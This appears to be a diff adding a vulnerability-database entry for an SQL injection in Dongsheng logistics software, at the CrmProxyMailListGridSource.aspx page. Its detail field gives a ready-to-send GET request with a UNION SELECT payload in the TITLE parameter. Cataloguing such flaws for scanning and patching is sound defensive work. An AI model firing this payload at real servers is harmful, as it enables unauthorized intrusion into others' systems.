@@ -1,0 +1,11 @@
+vendor = "东胜物流"
+name = "东胜物流软件 CrmProxyMailListGridSource.aspx SQL注入漏洞"
+type = "SQL注入"
+path = "/PriceCarrier/CrmProxyMailListGridSource.aspx"
+version = ""
+detail = "GET /PriceCarrier/CrmProxyMailListGridSource.aspx?handle=list&TITLE=1' UNION SELECT @@version-- HTTP/1.1 Host: target"
+fix = "升级至最新版本"
+date = 20260401
+label = "nday"
+cve = "TVD-2026-07472"
+verifier = "AdySec"
